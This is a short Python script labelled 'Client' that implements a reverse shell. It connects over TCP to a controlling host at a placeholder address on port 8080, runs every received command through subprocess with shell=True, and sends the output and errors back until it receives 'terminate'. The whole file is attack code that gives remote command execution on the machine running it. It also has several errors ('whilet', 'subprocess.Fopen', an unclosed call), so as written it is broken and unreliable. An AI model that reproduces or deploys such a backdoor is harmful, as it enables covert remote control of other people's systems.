# Client

import socket # For Building TCP Connection
import subprocess # To start the shell in the system

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('0.0.0.0', 8080))
	
	whilet True:												#keep receiving command
		command = s.recv(1024)
		
		if 'terminate' in command:
			s.close() # close the socket
			break
			
		else:
		
			CMD = subprocess.Fopen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
			s.send( CMD.stdout.read()	) # send the result
			s.send( CMD.stderr.read()	) # inase you mistyped a command.
			# we will send back the error
			
def main ():
	connect()
main()